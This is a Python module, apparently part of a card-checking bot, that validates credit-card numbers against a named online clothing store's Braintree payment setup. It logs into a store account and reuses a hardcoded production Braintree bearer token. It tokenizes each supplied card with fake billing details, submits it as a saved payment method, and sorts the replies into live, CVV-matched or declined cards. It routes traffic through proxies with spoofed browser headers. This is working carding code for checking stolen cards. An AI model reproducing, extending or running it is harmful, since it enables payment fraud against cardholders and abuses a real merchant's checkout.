"""b3wrapunzel.py — Braintree Auth (bellamodastudio.com) for /b3 /mb3 /b3txt."""

from __future__ import annotations

import base64
import json
import random
import re
import uuid
import asyncio
import aiohttp

_SITE = "https://bellamodastudio.com"
_ADD_PM_URL = f"{_SITE}/my-account/add-payment-method/"
_AJAX_URL = f"{_SITE}/wp-admin/admin-ajax.php"
_BT_GRAPHQL = "https://payments.braintree-api.com/graphql"

# WooCommerce account — update password on VPS if login fails
_LOGIN_USER = "khhhij"
_LOGIN_PASS = "CHANGE_ME"

# Braintree Vault bearer (bellamodastudio merchant) — refresh if tokenize fails
_BT_BEARER = (
    "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRy"
    "ZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3ODA0NDE1MDksImp0aSI6ImQzN2Ey"
    "ZjBkLTcwZmEtNDNlMC05NGIxLWU4M2ZhZWNmYjE1MiIsInN1YiI6ImhqMjNmdjVuNHBoc3pqamoiLCJpc3"
    "MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6"
    "ImhqMjNmdjVuNHBoc3pqamoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbG"
    "xldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJh"
    "aW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucy"
    "I6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiaW5mb2JlbGxhbW9kYXN0dWRpb2NvbSIsInBheXBhbF9jbG"
    "llbnRfaWQiOiJBVmtsRVE3OFR5M0lKVm9PeWVqUWx4em1LTnVxVVB1aE0xNEY5Vjg0Um5QVWZYdGx6"
    "UzhyeThIWUJGMy1Pc1BSN2dYcmVEWDBUTXF5cDNCTSJ9fQ.UBEYukFrbRN5tqz1wAF69IapB-xSXfbS"
    "CUlrnnS61rVxfZn8qttobF3D_7KE9khgJPgHLEeeZxXhOuDoXV-acA"
)

_BT_CONFIG_FALLBACK = (
    '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/'
    'merchants/hj23fv5n4phszjjj/client_api","assetsUrl":"https://assets.braintreegateway'
    '.com","analytics":{"url":"https://client-analytics.braintreegateway.com/hj23fv5n4phszjjj'
    '"},"merchantId":"hj23fv5n4phszjjj","venmo":"off","graphQL":{"url":"https://payments.'
    'braintree-api.com/graphql","features":["tokenize_credit_cards"]},"fastlane":{"enabled":'
    'true,"tokensOnDemand":null},"challenges":["cvv","postal_code"],"creditCards":'
    '{"supportedCardTypes":["Discover","MasterCard","Visa","American Express","UnionPay"]},'
    '"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":'
    '{"displayName":"Bella Moda Studio Inc.","clientId":"AVklEQ78Ty3IJVoOyejQlxzmKNuqUPuhM'
    '14F9V84RnPUfXtlzS8ry8HYBF3-OsPR7gXreDX0TMqyp3BM","assetsUrl":"https://checkout.paypal'
    '.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,'
    '"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW",'
    '"billingAgreementsEnabled":true,"merchantAccountId":"infobellamodastudiocom",'
    '"payeeEmail":null,"currencyIsoCode":"USD"}}'
)

HTTP_TIMEOUT = aiohttp.ClientTimeout(total=30, connect=10)

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
)

_GQL_QUERY = (
    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
    "tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 "
    "cardholderName expirationMonth expirationYear binData { prepaid healthcare debit "
    "durbinRegulated commercial payroll issuingBank countryOfIssuance productId business "
    "consumer purchase corporate } } } }"
)


def _clean_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return s[:limit] if s else "Declined"


def _doc_headers() -> dict:
    return {
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        ),
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "User-Agent": _UA,
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }



def _form_headers() -> dict:
    return {
        "Accept": _doc_headers()["Accept"],
        "Accept-Language": _doc_headers()["Accept-Language"],
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": _SITE,
        "Referer": _ADD_PM_URL,
        "User-Agent": _UA,
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
    }


def _bt_gql_headers(bearer: str) -> dict:
    return {
        "accept": "*/*",
        "accept-language": "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "authorization": f"Bearer {bearer}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": _UA,
        "priority": "u=1, i",
    }


def _extract_page(html: str) -> dict:
    login_nonce = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', html)
    payment_nonce = re.search(
        r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html,
    )
    client_nonce = re.search(
        r'(?:client_token_nonce|wc_braintree_cc_client_token_nonce)["\']?\s*[:=]\s*["\']([^"\']+)',
        html,
    )
    config = re.search(r'name="braintree_cc_config_data"\s+value="([^"]+)"', html)
    if not config:
        config = re.search(r"braintree_cc_config_data\s*=\s*'(\{.*?\})';", html, re.DOTALL)
    return {
        "login_nonce": login_nonce.group(1) if login_nonce else None,
        "payment_nonce": payment_nonce.group(1) if payment_nonce else None,
        "client_token_nonce": client_nonce.group(1) if client_nonce else None,
        "config_data": config.group(1) if config else None,
        "logged_in": "customer-logout" in html or "woocommerce-MyAccount-navigation" in html,
    }


async def _login(session: aiohttp.ClientSession, login_nonce: str, proxy_args: dict) -> bool:
    if not _LOGIN_PASS or _LOGIN_PASS == "CHANGE_ME":
        return False
    data = {
        "username": _LOGIN_USER,
        "password": _LOGIN_PASS,
        "woocommerce-login-nonce": login_nonce,
        "_wp_http_referer": "/my-account/add-payment-method/",
        "login": "Log in",
    }
    async with session.post(_ADD_PM_URL, data=data, headers=_form_headers(), **proxy_args) as r:
        if r.status >= 400:
            return False
        text = await r.text()
        return "woocommerce-error" not in text.lower()[:2000]


async def _fetch_bearer(session: aiohttp.ClientSession, client_nonce: str | None, proxy_args: dict) -> str | None:
    if not client_nonce:
        return None
    for action in (
        "wc_braintree_cc_get_client_token",
        "wc-braintree-cc-get-client-token",
        "wc_braintree_credit_card_get_client_token",
    ):
        try:
            async with session.post(
                _AJAX_URL,
                data={"action": action, "nonce": client_nonce},
                headers={
                    "User-Agent": _UA,
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": _SITE,
                    "Referer": _ADD_PM_URL,
                },
                **proxy_args
            ) as r:
                j = await r.json()
                raw = j.get("data")
                if not raw:
                    continue
                decoded = base64.b64decode(raw).decode("utf-8")
                fp = json.loads(decoded).get("authorizationFingerprint")
                if fp:
                    return fp
        except Exception:
            continue
    return None


async def _tokenize(
    session: aiohttp.ClientSession,
    bearer: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    device_id: str,
    proxy_args: dict
) -> tuple[str | None, str | None]:
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": device_id,
        },
        "query": _GQL_QUERY,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": "10080",
                        "streetAddress": "moksdfjh",
                    },
                },
                "options": {"validate": False},
            },
        },
        "operationName": "TokenizeCreditCard",
    }
    try:
        async with session.post(
            _BT_GRAPHQL,
            headers=_bt_gql_headers(bearer),
            json=payload,
            **proxy_args
        ) as r:
            j = await r.json()
    except Exception as e:
        return None, str(e)[:80]

    if j.get("errors"):
        err = j["errors"][0].get("message", "Tokenization failed")
        return None, _clean_msg(err)

    token = (j.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
    if not token:
        return None, "Failed to get card token"
    return token, None


def _classify_html(text: str) -> tuple[str, str, str]:
    html = text or ""
    pattern = r"Reason:\s*(.+?)\s*</li>"
    match = re.search(pattern, html, re.DOTALL | re.IGNORECASE)
    kopi = _clean_msg(match.group(1), 200) if match else ""

    def _from_reason(reason: str) -> tuple[str, str, str]:
        rl = reason.lower()
        if "risk_threshold" in rl:
            return "error", "RISK: Retry this BIN later", "rate_limit"
        if "cannot add a new payment method so soon" in rl or "wait for 20" in rl:
            return "error", "Please wait before adding another card", "rate_limit"
        if (
            "nice! new payment method added" in rl
            or "payment method successfully added" in rl
            or reason.startswith("1000:")
        ):
            return "approved", "Payment method added successfully", "cvv_approved"
        if "duplicate card exists" in rl:
            return "approved", "Duplicate card — Approved", "cvv_approved"
        if "gateway rejected: avs" in rl or "gateway rejected: avs_and_cvv" in rl:
            return "approved", "AVS — Approved", "cvv_approved"
        if "gateway rejected: cvv" in rl and "avs_and_cvv" not in rl:
            return "approved", "CVV — Approved", "cvv_approved"
        if "invalid postal code" in rl or "cvv." in rl:
            return "approved", "Approved (CVV)", "cvv_approved"
        if "card issuer declined cvv" in rl or "approved (ccn)" in rl:
            return "ccn", "Approved (CCN)", "ccn"
        if reason:
            return "declined", reason, "declined"
        return "declined", "Declined", "declined"

    if match:
        return _from_reason(kopi)

    low = html.lower()
    if "payment method successfully added" in low or "nice! new payment method added" in low:
        return "approved", "Payment method added successfully", "cvv_approved"
    if "risk_threshold" in low:
        return "error", "RISK: Retry this BIN later", "rate_limit"
    if "please wait for 20 seconds" in low:
        return "error", "Please wait before adding another card", "rate_limit"

    err = _extract_error_li(html)
    if err:
        return _from_reason(err)
    return "declined", "Unknown response", "declined"


def _extract_error_li(html: str) -> str | None:
    m = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', html, re.DOTALL | re.IGNORECASE)
    if m:
        return _clean_msg(m.group(1), 200)
    return None


def _format_proxy(proxy: str | None) -> str | None:
    if not proxy:
        return None
    p = str(proxy).strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{p}"


async def b3w_check_card(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Braintree Auth via bellamodastudio.com.

    Returns (status, message, code):
      status: approved | ccn | declined | error
    """
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    formatted_proxy = _format_proxy(proxy_url)
    proxy_args = {"proxy": formatted_proxy} if formatted_proxy else {}
    device_id = str(uuid.uuid4())


    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=HTTP_TIMEOUT
        ) as session:

            async with session.get(_ADD_PM_URL, headers=_doc_headers(), **proxy_args) as r1:
                if r1.status >= 400:
                    return "error", f"page_http_{r1.status}", "connection_error"
                html = await r1.text()

            page = _extract_page(html)

            if page["login_nonce"] and not page["logged_in"]:
                if not await _login(session, page["login_nonce"], proxy_args):
                    return "error", "Login failed — set _LOGIN_PASS in b3wrapunzel.py", "setup_error"
                async with session.get(_ADD_PM_URL, headers=_doc_headers(), **proxy_args) as r2:
                    html = await r2.text()
                    page = _extract_page(html)

            payment_nonce = page["payment_nonce"]
            if not payment_nonce:
                return "error", "Failed to extract payment nonce", "nonce_error"

            config_data = page["config_data"] or _BT_CONFIG_FALLBACK
            bearer = await _fetch_bearer(session, page["client_token_nonce"], proxy_args) or _BT_BEARER

            token, tok_err = await _tokenize(session, bearer, cc, mm, yy, cvv, device_id, proxy_args)
            if tok_err:
                low = tok_err.lower()
                if any(x in low for x in ("cvv", "cvc", "security code")):
                    return "ccn", tok_err, "ccn"
                if "proxy" in low or "tunnel" in low:
                    return "error", tok_err, "proxy_error"
                return "declined", tok_err, "declined"
            if not token:
                return "declined", "Tokenization failed", "declined"

            device_json = json.dumps({"correlation_id": device_id[:36]})
            pay_data = {
                "payment_method": "braintree_cc",
                "braintree_cc_nonce_key": token,
                "braintree_cc_device_data": device_json,
                "braintree_cc_3ds_nonce_key": "",
                "braintree_cc_config_data": config_data,
                "woocommerce-add-payment-method-nonce": payment_nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            }

            async with session.post(
                _ADD_PM_URL,
                data=pay_data,
                headers=_form_headers(),
                **proxy_args
            ) as pay_resp:
                html_resp = await pay_resp.text()

            return _classify_html(html_resp)

    except asyncio.TimeoutError:
        return "error", "Request timed out", "timeout"
    except aiohttp.ClientError as e:
        low = str(e).lower()
        if "proxy" in low or "tunnel" in low or "connect" in low:
            return "error", f"Proxy error: {str(e)[:60]}", "proxy_error"
        return "error", f"Connection error: {str(e)[:60]}", "connection_error"
    except Exception as e:
        return "error", str(e)[:80], "exception"


async def check_card_str(cc_str: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    return await b3w_check_card(
        parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip(), proxy_url,
    )
